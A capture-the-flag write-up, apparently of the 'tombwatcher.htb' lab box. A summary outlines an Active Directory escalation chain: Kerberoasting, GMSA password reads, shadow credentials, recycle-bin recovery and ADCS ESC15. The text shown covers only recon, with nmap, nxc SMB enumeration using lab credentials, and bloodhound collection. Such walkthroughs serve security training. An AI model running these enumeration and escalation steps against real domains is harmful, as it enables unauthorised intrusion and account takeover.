### Summary
We quickly see a Windows Active Directory environment. We scrape a bunch of `bloodhound` info given the beginner credentials and see some straightforward operations; we perform a targeted kerberoast to get auth as `alfred`; we perform `AddSelf` to `ReadGMSAPassword` to get auth as `ANSIBLE_DEV$`; we `ForceChangePassword` to get auth as `Sam`; We utilize `WriteOwner` to generate shadow credentials as `john` where we get access to `WinRM`. With a lot of digging and inspecting ADCS, we see some weird references to a user ID that can't be recovered and the AD recycling bin optional feature enabled. We recover `cert_admin` from the recycling bin and overwrite their password with `GenericAll`. Then we search vulnerable certs and find `ESC-15` which, after a couple tries, gives us credentials for `administrator`. 

### Tools
- `feroxbuster`
- `bloodhound`
- `bloodyAD` - AD swiss army knife
- `ntpdate` - align clock skew
- `nxc` - enumerate SMB shares, users, dump hashes from AD machines with `SPN`
- `hashcat`
- `certipy` - perform shadow credential attack

###### [[#Recon]]
- [[#Initial Scan]]
	- [[#nxc hostname]]
- [[#DNS - TCP 53]]
- [[#HTTP - TCP 80]]
- [[#SMB - TCP 445]]
- [[#Bloodhound]]
	- [[#WriteSPN (Targeted Kerberoast)]]
###### [[#User Auth - Alfred]]
- [[#Targeted Kerberoast]]
	- [[#via BloodyAD / nxc]]
	- [[#Hashcat]]
	- [[#Cleanup SPN]]
###### [[#User Auth - ANSIBLE_DEV$]]
- [[#Bloodhound - Alfred]]
- [[#AddSelf]]
- [[#ReadGMSAPassword]]
###### [[#User Auth - Sam]]
- [[#Bloodhound - Sam]]
- [[#ForceChangePassword]]
###### [[#User Shell - John]]
- [[#Bloodhound - John]]
- [[#WriteOwner]]
	- [[#Shadow Credential]]
	- [[#Shell]]
- [[#Bloodhound - John Again]]
###### [[#User Auth - cert_admin]]
- [[#ADCS]]
- [[#AD Recycle Bin]]
	- [[#Restoring Recycled User]]
	- [[#Reset Password]]
###### [[#Root Shell]]
- [[#Enumeration]]
- [[#ESC-15]]
	- [[#Scenario A (FAIL)]]
	- [[#Scenario B]]

---
# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv 10.129.12.205 -oN nmap/tcp             
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49695/tcp open  unknown          syn-ack ttl 127
49696/tcp open  unknown          syn-ack ttl 127
49698/tcp open  unknown          syn-ack ttl 127
49716/tcp open  unknown          syn-ack ttl 127
52693/tcp open  unknown          syn-ack ttl 127
```
```sh
❯ sudo nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49695,49696,49698,49716,52693 -sCV -vv 10.129.12.205 -oN nmap/tcpScript             
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-02-05 06:37:46Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-02-05T06:39:18+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2026-02-05T06:28:36
| Not valid after:  2027-02-05T06:28:36
| MD5:   45ac 2475 7d2e c70d 84a4 1a54 dad2 f465
| SHA-1: a1e3 3aea 18e3 1196 6077 1976 dcb7 12e5 c427 27ff
| -----BEGIN CERTIFICATE-----
| MIIGRzCCBS+gAwIBAgITLgAAAAPLS8UvS5l59QAAAAAAAzANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
| dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjYwMjA1MDYyODM2
| WhcNMjcwMjA1MDYyODM2WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
| YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANMbvLqrZ/theWRj84Sk
| rg2XIEjwCPXnTblkn3oT/tymCZ1yB7cZw+3K3G76WoKSU+mAM7eoALOOINFcnaDd
| 9OfGbVn15QQCBlQRvwuZElwpyym41J9cIJOVmk4XJ0LC98/kXnYkHsIHV8DGm/xv
| Osc2Su1PLJ/jTmvVLwox6EbRkKYFWwaAFaDffXR6BqEUyVI6CZE45uyXneLf+937
| hkCyzxKczPwcuxwN71t02atlgKr8bV9NABXjHVeWmVMJenzmUbP7lGNg4tV5b6Xh
| YKv36UcD8nNdKSliBHFefLUl+s3TTwjHbJpyckSE0a0GYXvPqp8JHdWu+kx7JTA/
| /pkCAwEAAaOCA0wwggNIMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBv
| AG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEw
| DgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCA
| MA4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCG
| SAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0O
| BBYEFO/9Qkga2aDW+qGQYeNeDHhnmpujMB8GA1UdIwQYMBaAFCrN5HoYF07vh90L
| HVZ5CkBQxvI6MIHPBgNVHR8EgccwgcQwgcGggb6ggbuGgbhsZGFwOi8vL0NOPXRv
| bWJ3YXRjaGVyLUNBLTEsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIw
| U2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz10b21id2F0
| Y2hlcixEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
| dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHGBggrBgEFBQcBAQSBuTCBtjCB
| swYIKwYBBQUHMAKGgaZsZGFwOi8vL0NOPXRvbWJ3YXRjaGVyLUNBLTEsQ049QUlB
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9dG9tYndhdGNoZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFz
| ZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1UdEQQ5MDeg
| HwYJKwYBBAGCNxkBoBIEEPyy7selMmxPu2rkBnNzTmGCFERDMDEudG9tYndhdGNo
| ZXIuaHRiME8GCSsGAQQBgjcZAgRCMECgPgYKKwYBBAGCNxkCAaAwBC5TLTEtNS0y
| MS0xMzkyNDkxMDEwLTEzNTg2Mzg3MjEtMjEyNjk4MjU4Ny0xMDAwMA0GCSqGSIb3
| DQEBBQUAA4IBAQBbI0lcb8VBnC+gYuiiR7xgoRRQXdJJKq50o9a0mtRY56v2hYJP
| ojcLvx4Cy8NWnaTMt37ff70blL6GDJZq0oMphvdk2H+fIYJupjp4gJ9yatrp6pwQ
| tld6lO2jgFrBcXD0btFyPzEbF8/Bdt1AWD3YZg+dN1UyN499ye/Slja08tgrdGHs
| 2p39ggMvSOJtQsq1vaQE7ziCDfqGIfwzYg5fxa9ak8AfTWDiVMFQ1J7tR4YAPjSv
| JrzRwto+0NctQ2uJ8jiQPrQU1RlXu4+zHhc5Uqj7RDVYqGDCuQIkwen+7VeV/wW0
| NZCJYCfnuVmSbKRGgs1B6LRxNhDNFnkxo/TF
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2026-02-05T06:28:36
| Not valid after:  2027-02-05T06:28:36
| MD5:   45ac 2475 7d2e c70d 84a4 1a54 dad2 f465
| SHA-1: a1e3 3aea 18e3 1196 6077 1976 dcb7 12e5 c427 27ff
| -----BEGIN CERTIFICATE-----
| MIIGRzCCBS+gAwIBAgITLgAAAAPLS8UvS5l59QAAAAAAAzANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
| dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjYwMjA1MDYyODM2
| WhcNMjcwMjA1MDYyODM2WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
| YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANMbvLqrZ/theWRj84Sk
| rg2XIEjwCPXnTblkn3oT/tymCZ1yB7cZw+3K3G76WoKSU+mAM7eoALOOINFcnaDd
| 9OfGbVn15QQCBlQRvwuZElwpyym41J9cIJOVmk4XJ0LC98/kXnYkHsIHV8DGm/xv
| Osc2Su1PLJ/jTmvVLwox6EbRkKYFWwaAFaDffXR6BqEUyVI6CZE45uyXneLf+937
| hkCyzxKczPwcuxwN71t02atlgKr8bV9NABXjHVeWmVMJenzmUbP7lGNg4tV5b6Xh
| YKv36UcD8nNdKSliBHFefLUl+s3TTwjHbJpyckSE0a0GYXvPqp8JHdWu+kx7JTA/
| /pkCAwEAAaOCA0wwggNIMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBv
| AG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEw
| DgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCA
| MA4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCG
| SAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0O
| BBYEFO/9Qkga2aDW+qGQYeNeDHhnmpujMB8GA1UdIwQYMBaAFCrN5HoYF07vh90L
| HVZ5CkBQxvI6MIHPBgNVHR8EgccwgcQwgcGggb6ggbuGgbhsZGFwOi8vL0NOPXRv
| bWJ3YXRjaGVyLUNBLTEsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIw
| U2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz10b21id2F0
| Y2hlcixEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
| dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHGBggrBgEFBQcBAQSBuTCBtjCB
| swYIKwYBBQUHMAKGgaZsZGFwOi8vL0NOPXRvbWJ3YXRjaGVyLUNBLTEsQ049QUlB
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9dG9tYndhdGNoZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFz
| ZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1UdEQQ5MDeg
| HwYJKwYBBAGCNxkBoBIEEPyy7selMmxPu2rkBnNzTmGCFERDMDEudG9tYndhdGNo
| ZXIuaHRiME8GCSsGAQQBgjcZAgRCMECgPgYKKwYBBAGCNxkCAaAwBC5TLTEtNS0y
| MS0xMzkyNDkxMDEwLTEzNTg2Mzg3MjEtMjEyNjk4MjU4Ny0xMDAwMA0GCSqGSIb3
| DQEBBQUAA4IBAQBbI0lcb8VBnC+gYuiiR7xgoRRQXdJJKq50o9a0mtRY56v2hYJP
| ojcLvx4Cy8NWnaTMt37ff70blL6GDJZq0oMphvdk2H+fIYJupjp4gJ9yatrp6pwQ
| tld6lO2jgFrBcXD0btFyPzEbF8/Bdt1AWD3YZg+dN1UyN499ye/Slja08tgrdGHs
| 2p39ggMvSOJtQsq1vaQE7ziCDfqGIfwzYg5fxa9ak8AfTWDiVMFQ1J7tR4YAPjSv
| JrzRwto+0NctQ2uJ8jiQPrQU1RlXu4+zHhc5Uqj7RDVYqGDCuQIkwen+7VeV/wW0
| NZCJYCfnuVmSbKRGgs1B6LRxNhDNFnkxo/TF
|_-----END CERTIFICATE-----
|_ssl-date: 2026-02-05T06:39:19+00:00; +4h00m00s from scanner time.
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2026-02-05T06:28:36
| Not valid after:  2027-02-05T06:28:36
| MD5:   45ac 2475 7d2e c70d 84a4 1a54 dad2 f465
| SHA-1: a1e3 3aea 18e3 1196 6077 1976 dcb7 12e5 c427 27ff
| -----BEGIN CERTIFICATE-----
| MIIGRzCCBS+gAwIBAgITLgAAAAPLS8UvS5l59QAAAAAAAzANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
| dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjYwMjA1MDYyODM2
| WhcNMjcwMjA1MDYyODM2WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
| YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANMbvLqrZ/theWRj84Sk
| rg2XIEjwCPXnTblkn3oT/tymCZ1yB7cZw+3K3G76WoKSU+mAM7eoALOOINFcnaDd
| 9OfGbVn15QQCBlQRvwuZElwpyym41J9cIJOVmk4XJ0LC98/kXnYkHsIHV8DGm/xv
| Osc2Su1PLJ/jTmvVLwox6EbRkKYFWwaAFaDffXR6BqEUyVI6CZE45uyXneLf+937
| hkCyzxKczPwcuxwN71t02atlgKr8bV9NABXjHVeWmVMJenzmUbP7lGNg4tV5b6Xh
| YKv36UcD8nNdKSliBHFefLUl+s3TTwjHbJpyckSE0a0GYXvPqp8JHdWu+kx7JTA/
| /pkCAwEAAaOCA0wwggNIMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBv
| AG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEw
| DgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCA
| MA4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCG
| SAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0O
| BBYEFO/9Qkga2aDW+qGQYeNeDHhnmpujMB8GA1UdIwQYMBaAFCrN5HoYF07vh90L
| HVZ5CkBQxvI6MIHPBgNVHR8EgccwgcQwgcGggb6ggbuGgbhsZGFwOi8vL0NOPXRv
| bWJ3YXRjaGVyLUNBLTEsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIw
| U2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz10b21id2F0
| Y2hlcixEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
| dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHGBggrBgEFBQcBAQSBuTCBtjCB
| swYIKwYBBQUHMAKGgaZsZGFwOi8vL0NOPXRvbWJ3YXRjaGVyLUNBLTEsQ049QUlB
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9dG9tYndhdGNoZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFz
| ZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1UdEQQ5MDeg
| HwYJKwYBBAGCNxkBoBIEEPyy7selMmxPu2rkBnNzTmGCFERDMDEudG9tYndhdGNo
| ZXIuaHRiME8GCSsGAQQBgjcZAgRCMECgPgYKKwYBBAGCNxkCAaAwBC5TLTEtNS0y
| MS0xMzkyNDkxMDEwLTEzNTg2Mzg3MjEtMjEyNjk4MjU4Ny0xMDAwMA0GCSqGSIb3
| DQEBBQUAA4IBAQBbI0lcb8VBnC+gYuiiR7xgoRRQXdJJKq50o9a0mtRY56v2hYJP
| ojcLvx4Cy8NWnaTMt37ff70blL6GDJZq0oMphvdk2H+fIYJupjp4gJ9yatrp6pwQ
| tld6lO2jgFrBcXD0btFyPzEbF8/Bdt1AWD3YZg+dN1UyN499ye/Slja08tgrdGHs
| 2p39ggMvSOJtQsq1vaQE7ziCDfqGIfwzYg5fxa9ak8AfTWDiVMFQ1J7tR4YAPjSv
| JrzRwto+0NctQ2uJ8jiQPrQU1RlXu4+zHhc5Uqj7RDVYqGDCuQIkwen+7VeV/wW0
| NZCJYCfnuVmSbKRGgs1B6LRxNhDNFnkxo/TF
|_-----END CERTIFICATE-----
|_ssl-date: 2026-02-05T06:39:18+00:00; +4h00m00s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2026-02-05T06:28:36
| Not valid after:  2027-02-05T06:28:36
| MD5:   45ac 2475 7d2e c70d 84a4 1a54 dad2 f465
| SHA-1: a1e3 3aea 18e3 1196 6077 1976 dcb7 12e5 c427 27ff
| -----BEGIN CERTIFICATE-----
| MIIGRzCCBS+gAwIBAgITLgAAAAPLS8UvS5l59QAAAAAAAzANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
| dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjYwMjA1MDYyODM2
| WhcNMjcwMjA1MDYyODM2WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
| YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANMbvLqrZ/theWRj84Sk
| rg2XIEjwCPXnTblkn3oT/tymCZ1yB7cZw+3K3G76WoKSU+mAM7eoALOOINFcnaDd
| 9OfGbVn15QQCBlQRvwuZElwpyym41J9cIJOVmk4XJ0LC98/kXnYkHsIHV8DGm/xv
| Osc2Su1PLJ/jTmvVLwox6EbRkKYFWwaAFaDffXR6BqEUyVI6CZE45uyXneLf+937
| hkCyzxKczPwcuxwN71t02atlgKr8bV9NABXjHVeWmVMJenzmUbP7lGNg4tV5b6Xh
| YKv36UcD8nNdKSliBHFefLUl+s3TTwjHbJpyckSE0a0GYXvPqp8JHdWu+kx7JTA/
| /pkCAwEAAaOCA0wwggNIMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBv
| AG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEw
| DgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCA
| MA4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCG
| SAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0O
| BBYEFO/9Qkga2aDW+qGQYeNeDHhnmpujMB8GA1UdIwQYMBaAFCrN5HoYF07vh90L
| HVZ5CkBQxvI6MIHPBgNVHR8EgccwgcQwgcGggb6ggbuGgbhsZGFwOi8vL0NOPXRv
| bWJ3YXRjaGVyLUNBLTEsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIw
| U2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz10b21id2F0
| Y2hlcixEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
| dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHGBggrBgEFBQcBAQSBuTCBtjCB
| swYIKwYBBQUHMAKGgaZsZGFwOi8vL0NOPXRvbWJ3YXRjaGVyLUNBLTEsQ049QUlB
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9dG9tYndhdGNoZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFz
| ZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1UdEQQ5MDeg
| HwYJKwYBBAGCNxkBoBIEEPyy7selMmxPu2rkBnNzTmGCFERDMDEudG9tYndhdGNo
| ZXIuaHRiME8GCSsGAQQBgjcZAgRCMECgPgYKKwYBBAGCNxkCAaAwBC5TLTEtNS0y
| MS0xMzkyNDkxMDEwLTEzNTg2Mzg3MjEtMjEyNjk4MjU4Ny0xMDAwMA0GCSqGSIb3
| DQEBBQUAA4IBAQBbI0lcb8VBnC+gYuiiR7xgoRRQXdJJKq50o9a0mtRY56v2hYJP
| ojcLvx4Cy8NWnaTMt37ff70blL6GDJZq0oMphvdk2H+fIYJupjp4gJ9yatrp6pwQ
| tld6lO2jgFrBcXD0btFyPzEbF8/Bdt1AWD3YZg+dN1UyN499ye/Slja08tgrdGHs
| 2p39ggMvSOJtQsq1vaQE7ziCDfqGIfwzYg5fxa9ak8AfTWDiVMFQ1J7tR4YAPjSv
| JrzRwto+0NctQ2uJ8jiQPrQU1RlXu4+zHhc5Uqj7RDVYqGDCuQIkwen+7VeV/wW0
| NZCJYCfnuVmSbKRGgs1B6LRxNhDNFnkxo/TF
|_-----END CERTIFICATE-----
|_ssl-date: 2026-02-05T06:39:19+00:00; +4h00m00s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49695/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49696/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49698/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49716/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
52693/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3h59m59s, deviation: 0s, median: 3h59m59s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 40298/tcp): CLEAN (Timeout)
|   Check 2 (port 65198/tcp): CLEAN (Timeout)
|   Check 3 (port 58608/udp): CLEAN (Timeout)
|   Check 4 (port 17847/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-02-05T06:38:39
|_  start_date: N/A
```

- Judging by the IIS version, we're working with Windows 10 or later
- We've got a lot of ports that correspond to an Active Directory environment
- The hostname is `DC01.tombwatcher.htb`
- We're given default creds `henry / H3nry_987TGV!`

### nxc hostname
- We can grab the hostname via `nxc smb` and `sponge`:
```sh
❯ nxc smb 10.129.12.205 --generate-hosts-file hosts                                            
SMB         10.129.12.205   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)

❯ ccat hosts           
10.129.12.205     DC01.tombwatcher.htb tombwatcher.htb DC01
❯ cat hosts /etc/hosts | sudo sponge /etc/hosts
```

## DNS - TCP 53
---
- For DNS enumeration, the first thing to do is try to resolve the IPs of the box. I’ll use `nslookup`, setting the server to Tombwatcher, and then looking up Tombwatcher’s IP:
```sh
❯ nslookup                                         
> server 10.129.12.205
Default server: 10.129.12.205
Address: 10.129.12.205#53
> 10.129.12.205
;; communications error to 10.129.12.205#53: timed out
```
- Doesn't look like we've got anything interesting

## HTTP - TCP 80
---
- Navigating to the web page, we get the default `IIS` server
- We can try probing it with `feroxbuster` but we get nothing interesting

## SMB - TCP 445
---
- We first perform standard `smb` enumeration:
```sh
❯ nxc smb 10.129.12.205 -u '' -p ''                             
SMB         10.129.12.205   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.12.205   445    DC01             [+] tombwatcher.htb\: 
❯ nxc smb 10.129.12.205 -u guest -p ''
SMB         10.129.12.205   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.12.205   445    DC01             [-] tombwatcher.htb\guest: STATUS_ACCOUNT_DISABLED 
❯ nxc smb 10.129.12.205 -u '' -p '' --shares
SMB         10.129.12.205   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.12.205   445    DC01             [+] tombwatcher.htb\: 
SMB         10.129.12.205   445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
```
- guest account is disabled and blank credentials doesn't allow us to enumerate shares

- We can test the given credentials to see if we have `smb` access:
```sh
❯ nxc smb 10.129.12.205 -u henry -p 'H3nry_987TGV!'      
SMB         10.129.12.205   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.12.205   445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
```
- We've got access!

```sh
❯ nxc smb 10.129.12.205 -u henry -p 'H3nry_987TGV!' --shares
Share           Permissions     Remark              
-----           -----------     ------              
ADMIN$                          Remote Admin        
C$                              Default share       
IPC$            READ            Remote IPC          
NETLOGON        READ            Logon server share  
SYSVOL          READ            Logon server share  
```
- Looks like default shares for a Windows DC

```sh
❯ nxc smb 10.129.12.205 -u henry -p 'H3nry_987TGV!' --users 
-Username-                    -Last PW Set-       -BadPW- -Description-                                                
Administrator                 2025-04-25 14:56:03 0       Built-in account for administering the computer/domain       
Guest                         <never>             0       Built-in account for guest access to the computer/domain     
krbtgt                        2024-11-16 00:02:28 0       Key Distribution Center Service Account                      
Henry                         2025-05-12 15:17:03 0                              
Alfred                        2025-05-12 15:17:03 0                              
sam                           2025-05-12 15:17:03 0                              
john                          2025-05-19 13:25:10 0                              
```
- The users `Henry`, `Alfred`, `sam`, and `john` are non-default users

## Bloodhound
---
- We can use `bloodhound.py` and `rusthound` to collect `bloodhound` data for us, we like to use both since they can cover each other's bases
```sh
❯ bloodhound-ce-python -c all -d tombwatcher.htb -u henry -p H3nry_987TGV! -ns 10.129.12.205 --zip

❯ rusthound -d tombwatcher.htb -u henry -p H3nry_987TGV! -n 10.129.12.205 --zip
```

